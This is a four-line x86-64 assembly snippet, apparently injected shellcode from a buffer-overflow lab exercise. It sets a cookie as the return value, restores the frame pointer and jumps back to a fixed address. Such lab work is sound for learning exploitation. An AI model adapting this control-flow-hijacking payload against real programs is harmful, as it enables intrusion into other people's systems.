mov    $0x31ef3fbf, %rax       #return cookie
lea    0x10(%rsp), %rbp  #还原rbp 
pushq  $0x401565 
ret  